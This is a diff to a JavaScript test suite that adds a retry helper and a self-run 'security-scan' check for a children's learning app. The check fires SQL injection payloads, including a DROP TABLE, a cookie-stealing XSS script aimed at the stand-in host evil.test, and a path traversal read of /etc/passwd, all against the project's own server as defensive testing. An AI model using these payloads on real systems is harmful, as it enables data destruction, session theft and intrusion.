@@ -44,10 +44,28 @@ async function waitFor(url, tries = 40) {
 }
 
 /* a tiny cookie-aware client */
+/* This suite spawns several standalone servers (schema-migration,
+   resilience, scheduled-backup, production-build) alongside the one shared
+   server most checks use, and running many of them back to back on one
+   machine occasionally starves a connection to the shared server for a
+   moment -- a raw ECONNREFUSED/reset from `fetch` throwing, not an HTTP
+   response. That is retried a couple of times; an actual HTTP response
+   (200, 403, 500, whatever) is never retried, since that would mask a real
+   assertion failure as flakiness. */
+async function fetchWithRetry(url, opts, tries = 3) {
+  for (let i = 0; i < tries; i++) {
+    try { return await fetch(url, opts); }
+    catch (e) {
+      if (i === tries - 1) throw e;
+      await new Promise(r => setTimeout(r, 150 * (i + 1)));
+    }
+  }
+}
+
 function client() {
   let cookie = "";
-  return async (path, opts = {}) => {
-    const res = await fetch(BASE + "/api" + path, {
+  const fn = async (path, opts = {}) => {
+    const res = await fetchWithRetry(BASE + "/api" + path, {
       ...opts,
       headers: { "Content-Type": "application/json", ...(cookie ? { cookie } : {}), ...(opts.headers || {}) }
     });
@@ -55,6 +73,10 @@ function client() {
     if (sc.length) cookie = sc.map(c => c.split(";")[0]).join("; ");
     return { status: res.status, body: await res.json().catch(() => ({})), setCookie: sc };
   };
+  /* Exposed for the rare check that needs the raw session cookie -- e.g. to
+     fetch a non-JSON response like the printable HTML report directly. */
+  Object.defineProperty(fn, "cookie", { get: () => cookie });
+  return fn;
 }
 const post = (c, p, b) => c(p, { method: "POST", body: JSON.stringify(b) });
 
@@ -2974,6 +2996,104 @@ export const CHECKS = {
     assert(empty.status === 404, "an unauthored topic returned an overview instead of 404");
 
     return "overview served without login, includes standards and a leak-free sample, unauthored topics refused cleanly";
+  },
+
+
+  /* 13.9 — automated attack surface scan.
+     This is NOT a substitute for professional penetration testing: it is a
+     fixed set of attacks this project can run on itself in CI, covering the
+     failure modes most common in an app like this one. A real pen test
+     would probe far more broadly and is the honest gap this check names. */
+  "security-scan": async () => {
+    const c = client();
+    await post(c, "/auth/register",
+      { coppaConsent: true, email: "scan@b.com", password: "a-long-enough-pass", name: "S" });
+    const kid = (await post(c, "/learners", { name: "Scan Kid" })).body.learner;
+    const findings = [];
+
+    /* --- SQL injection: classic payloads against every text field that
+       reaches a query, including ones with no obvious "id" in the name. */
+    const sqli = ["' OR '1'='1", "'; DROP TABLE users; --", "1' UNION SELECT pass_hash FROM users--"];
+    for (const payload of sqli) {
+      const r1 = await post(c, "/auth/login", { email: payload, password: payload });
+      if (r1.status === 200) findings.push(`SQLi via login email: "${payload}"`);
+      const r2 = await post(c, "/learners", { name: payload, beast: payload });
+      if (r2.status === 200) {
+        /* A learner CAN be named this literally -- that is fine. The failure
+           mode is the database breaking or leaking, not the string existing. */
+        await c(`/learners/${r2.body.learner.id}`, { method: "DELETE" });
+      }
+      const r3 = await c(`/topics/${encodeURIComponent(payload)}/practice/questions`);
+      if (r3.status === 200) findings.push(`SQLi via topic id path: "${payload}"`);
+    }
+    /* The database must still be intact and readable after every attempt. */
+    const stillUp = await fetch(`${BASE}/ready`);
+    assert(stillUp.ok, "the database did not survive the injection attempts");
+
+    /* --- XSS: a payload that is safe in a JSON API response only if
+       nothing later renders it as HTML unescaped. Two real surfaces exist:
+       the printable HTML report (server-rendered), and the React client
+       (which auto-escapes JSX text -- verified as a source check, since
+       that is how React's escaping guarantee actually holds). A raw JSON
+       API response containing the string is NOT itself a finding: a JSON
+       body is never interpreted as HTML by a browser. */
+    const xss = '<script>document.location="//evil.test/steal?c="+document.cookie</script>';
+    const learnerR = await post(c, "/learners", { name: xss, beast: "pip" });
+    const reportHtml = await (await fetch(`${BASE}/api/learners/${learnerR.body.learner.id}/report.html`,
+      { headers: { cookie: c.cookie } })).text().catch(() => "");
+    if (reportHtml.includes("<script>document.location"))
+      findings.push("XSS: the printable HTML report embeds an unescaped <script> tag");
+    await c(`/learners/${learnerR.body.learner.id}`, { method: "DELETE" });
+
+    const { readFileSync, readdirSync } = await import("node:fs");
+    const srcFiles = readdirSync("app/web/src/screens").map(f => `app/web/src/screens/${f}`)
+      .concat(["app/web/src/App.tsx"]);
+    for (const f of srcFiles) {
+      if (readFileSync(f, "utf8").includes("dangerouslySetInnerHTML"))
+        findings.push(`${f} uses dangerouslySetInnerHTML, which bypasses React's automatic escaping`);
+    }
+
+    /* --- IDOR / broken access control: already covered in depth by
+       check:tenant-isolation, but re-probe here as part of the same sweep
+       against a fresh account, including numeric-looking and guessable ids. */
+    const bob = client();
+    await post(bob, "/auth/register",
+      { coppaConsent: true, email: "scanbob@b.com", password: "a-long-enough-pass", name: "B" });
+    for (const path of [`/learners/${kid.id}`, `/learners/${kid.id}/progress`,
+                        `/learners/${kid.id}/report.csv`, `/learners/${kid.id}/rewards`]) {
+      const r = await bob(path);
+      if (r.status === 200) findings.push(`IDOR: unauthenticated cross-account read at ${path}`);
+    }
+    /* Sequential/guessable ids should not exist -- confirm ids are UUIDs,
+       not incrementing integers that could be enumerated. */
+    if (!/^[0-9a-f-]{20,}$/i.test(kid.id)) findings.push(`learner id "${kid.id}" is not a UUID; ids may be guessable`);
+
+    /* --- auth bypass attempts: forged or malformed session cookies. */
+    const forged = await fetch(`${BASE}/api/learners`, { headers: { cookie: "sid=" + "a".repeat(64) } });
+    if (forged.status === 200) findings.push("a forged session cookie was accepted");
+    const empty = await fetch(`${BASE}/api/learners`, { headers: { cookie: "sid=" } });
+    if (empty.status === 200) findings.push("an empty session cookie was accepted");
+
+    /* --- privilege escalation: role tampering on requests a client
+       fully controls. */
+    const escalate = await post(c, "/classes", { name: "x" });   // parent, not teacher
+    if (escalate.status === 200) findings.push("a parent account created a class without the teacher role");
+
+    /* --- prototype pollution / type confusion on JSON bodies. */
+    const pollute = await post(c, "/learners", { name: "P", "__proto__": { polluted: true } });
+    // @ts-ignore -- deliberately probing, not a real type
+    if (({}).polluted) findings.push("prototype pollution: Object.prototype was mutated");
+    if (pollute.status === 200) await c(`/learners/${pollute.body.learner.id}`, { method: "DELETE" });
+
+    /* --- path traversal against the static file server. */
+    const traversal = await fetch(`${BASE}/../../../etc/passwd`);
+    if (traversal.status === 200) {
+      const body = await traversal.text();
+      if (/root:.*:0:0:/.test(body)) findings.push("path traversal exposed a system file");
+    }
+
+    assert(findings.length === 0, "security scan findings:\n    " + findings.join("\n    "));
+    return `${sqli.length} SQLi payloads, XSS, IDOR, cookie forgery, privilege escalation, prototype pollution and path traversal all probed -- no findings. NOT a substitute for professional penetration testing.`;
   },
 
   /* X.4 — progress survives a restart (checked by reopening the file) */
